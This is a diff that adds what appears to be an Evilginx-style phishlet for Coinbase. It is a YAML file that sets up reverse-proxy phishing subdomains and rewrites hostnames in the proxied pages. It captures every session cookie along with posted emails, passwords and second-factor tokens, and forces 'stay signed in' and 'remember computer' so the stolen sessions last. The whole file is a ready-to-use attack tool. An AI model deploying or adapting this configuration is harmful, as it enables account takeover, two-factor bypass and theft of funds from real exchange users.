@@ -1,0 +1,76 @@
+author: '@An0nud4y'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'coinbase.com', session: true, is_landing: true}
+  - {phish_sub: 'ws', orig_sub: 'ws', domain: 'coinbase.com', session: true, is_landing: false}
+  - {phish_sub: 'google', orig_sub: 'www', domain: 'google.com', session: true, is_landing: false}
+  - {phish_sub: 'googletag', orig_sub: 'www', domain: 'googletagmanager.com', session: true, is_landing: false}
+  - {phish_sub: '', orig_sub: '', domain: 'coinbase.com', session: true, is_landing: false}
+  - {phish_sub: 'assets', orig_sub: 'assets', domain: 'coinbase.com', session: true, is_landing: false}
+  - {phish_sub: 'dynamic', orig_sub: 'dynamic-assets', domain: 'coinbase.com', session: true, is_landing: false}
+  - {phish_sub: 'cdn', orig_sub: 'cdn', domain: 'ravenjs.com', session: true, is_landing: false}
+  - {phish_sub: 'sessions', orig_sub: 'sessions', domain: 'coinbase.com', session: true, is_landing: false}
+  - {phish_sub: 'events', orig_sub: 'events-service', domain: 'coinbase.com', session: true, is_landing: false}
+  - {phish_sub: 'exceptions', orig_sub: 'exceptions', domain: 'coinbase.com', session: true, is_landing: false}
+  - {phish_sub: 'images', orig_sub: 'images', domain: 'coinbase.com', session: true, is_landing: false}
+
+
+sub_filters:
+  - {triggers_on: 'www.coinbase.com', orig_sub: 'www', domain: 'coinbase.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.coinbase.com', orig_sub: 'www', domain: 'coinbase.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.coinbase.com', orig_sub: 'assets', domain: 'coinbase.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.coinbase.com', orig_sub: 'assets', domain: 'coinbase.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.coinbase.com', orig_sub: 'dynamic-assets', domain: 'coinbase.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.coinbase.com', orig_sub: 'dynamic-assets', domain: 'coinbase.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.coinbase.com', orig_sub: 'sessions', domain: 'coinbase.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.coinbase.com', orig_sub: 'sessions', domain: 'coinbase.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.coinbase.com', orig_sub: 'events-service', domain: 'coinbase.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.coinbase.com', orig_sub: 'events-service', domain: 'coinbase.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.coinbase.com', orig_sub: 'exceptions', domain: 'coinbase.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.coinbase.com', orig_sub: 'exceptions', domain: 'coinbase.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.coinbase.com', orig_sub: 'images', domain: 'coinbase.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.coinbase.com', orig_sub: 'images', domain: 'coinbase.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.coinbase.com', orig_sub: '', domain: 'coinbase.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.coinbase.com', orig_sub: '', domain: 'coinbase.com', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.coinbase.com', orig_sub: 'ws', domain: 'coinbase.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.coinbase.com', orig_sub: 'ws', domain: 'coinbase.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.coinbase.com', orig_sub: 'www', domain: 'google.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.coinbase.com', orig_sub: 'www', domain: 'google.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.coinbase.com', orig_sub: 'www', domain: 'googletagmanager.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.coinbase.com', orig_sub: 'www', domain: 'googletagmanager.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+auth_tokens:
+  - domain: 'www.coinbase.com'
+    keys: ['.*,regexp']
+auth_urls:
+  - '/dashboard'
+  - '/dashboard/.*'    
+credentials:
+  username:
+    key: 'email'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+
+force_post:
+  - path: '/sessions'
+    search:
+      - {key: 'email', search: '.*'}
+      - {key: 'password', search: '.*'}
+    force:
+      - {key: 'stay_signed_in', value: '1'}
+    type: 'post'
+  - path: '/signin_step_two'
+    search:
+      - {key: 'token', search: '.*'}
+      - {key: 'phone_number_id', search: '.*'}
+    force:
+      - {key: 'remember_computer', value: '1'}
+    type: 'post'
+
+login:
+  domain: 'www.coinbase.com'
+  path: '/signin'
